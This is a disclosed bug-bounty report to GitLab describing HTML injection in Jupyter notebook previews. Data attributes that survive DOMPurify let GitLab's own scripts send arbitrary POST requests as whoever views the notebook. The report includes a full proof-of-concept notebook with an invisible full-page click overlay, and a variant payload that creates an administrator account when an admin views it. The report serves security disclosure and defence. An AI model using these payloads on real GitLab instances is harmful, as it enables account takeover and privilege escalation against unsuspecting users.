# Arbitrary POST request as victim user from HTML injection in Jupyter notebooks

## Report Details
- **Report ID**: 1409788
- **URL**: https://hackerone.com/reports/1409788
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-11-24T23:18:42.001Z
- **Disclosed**: 2022-05-20T14:32:25.611Z

## Reporter
- **Username**: joaxcar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
An attacker can create a Jupyter notebook that will make arbitrary POST requests as the victim user. In the "worst case" an attacker could make an admin create a new admin account for the attacker. Other possible attack vectors are forcing invites to private projects etc. Every POST request is possible.

This research is loosely based on the issue with Rails Ujs data-* parameters. Nowadays DOMPurify strips Rails Ujs data- attributes such as data-url and data-method. What is not stripped is arbitrary data attributes. Looking through the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js , which is run on page load in the UI, I found multiple vectors still possible to abuse.

The script hooks up a lot of event listeners and modifications to the DOM. What is of particular interest for us is the part that is delayed to let additional data on the page load.

```
function deferredInitialisation() {
  const $body = $('body');

  initTopNav();
  initBreadcrumbs();
  initTodoToggle();
  initLogoAnimation();
  initServicePingConsent();
  initUserPopovers();
  initBroadcastNotifications();
  initPersistentUserCallouts();
  initDefaultTrackers();
  initFeatureHighlight();
```

Reading through the source files for these functions I managed to find multiple selector/data-attribute combinations that can be used even with purified HTML.

As an example we have persistent_user_callout in

https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js

where a POST request is made like

```
dismiss(event, deferredLinkOptions = null) {
    event.preventDefault();

    axios
      .post(this.dismissEndpoint, {
        feature_name: this.featureId,
      })
```

the `dissmissEndpoint` is controllable through a data attribute `data-dissmiss-endpoint`. The data attributes are extracted like so

```
export default class PersistentUserCallout {
  constructor(container, options = container.dataset) {
    const { dismissEndpoint, featureId, deferLinks } = options;
    this.container = container;
    this.dismissEndpoint = dismissEndpoint;
    this.featureId = featureId;
    this.deferLinks = parseBoolean(deferLinks);

    this.init();
  }
```

To be able to fire the dismiss function (and thus the POST request) we also need a `js-close` button

```
const closeButton = this.container.querySelector('.js-close');
```

The HTML needed to set this up is

```
<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\">
    <button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">
        hack
    </button>
</div>
```

The styling is there to make the button as an invisible overlay over the whole page making it trigger on a click anywhere.

Now to the attack. If an attacker creates a Jupyter Notebook there exists the possibility to add HTML in the output fields. This HTML will be sanitized by DOMPurify, but this will not stop the attack.

A file like this will do as a simple POC

```
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```

I have added a `feature-highlight` (another possible vector, see image) just to show when the attack is successful. As the main.js script is run with a timer, sometimes one has to refresh the page to have the payload "load up" (this could possibly be worked around). When the attack is loaded, the highlight div will turn into a blue dot.

{F1525031}

Visiting this site and clicking anywhere will add a Todo on an Issue on one of my projects. I have also tested this attack with an attack creating an admin account. Replacing the payload in the POC with this one

```
"text/html": "<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/users?admin=true&email=joaxcarte01@wearehackerone.com&name=just&username=just&password=asdasdasdasd\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">.</button></div>\n"}
```

A visit by an admin to this site would end up with a new admin account being created.

Finally I want to point out that this kind of attack is possible anywhere where HTML injection could happen. Even with Purified HTML.

### Steps to reproduce
1. Create a project on GitLab.com
2. Create a new file named `hack.ipynb` (or upload the included file) with the content
{F1525030}
```
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```
3. Click save
4. After saving you will land on the preview page for the file. If the out block does not contain a blue dot, refresh this page.
5. When the dot is blue click anywhere on the page
6. Now go to https://gitlab.com/dashboard/todos and check that a todo have been added

video example of the POC (note the todo being empty and the blue dot):

█████

### Impact

An attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.

### Examples

Private project:
https://gitlab.com/parent02/sub2/asd/-/blob/main/hack.ipynb

### What is the current *bug* behavior?

DOMPurify does not filter out arbitrary data-* attributes, making it possible to high jack Gitlab UI JavaScript to make POST requests

### What is the expected *correct* behavior?

The attributes should not work in Jupyter notebooks

### Output of checks

This bug happens on GitLab.com

## Impact

An attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.

## Attachments
- hack.ipynb
- dot.png
